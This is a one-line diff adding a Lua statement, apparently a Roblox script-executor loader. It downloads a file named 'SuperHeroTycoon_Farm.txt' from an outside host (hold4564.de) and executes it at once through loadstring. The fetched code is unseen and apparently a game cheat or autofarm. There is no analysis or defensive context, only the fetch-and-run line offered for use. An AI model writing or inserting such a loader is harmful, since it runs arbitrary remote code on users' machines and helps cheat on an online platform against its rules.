@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://hold4564.de/Scripts/SuperHeroTycoon_Farm.txt'))()
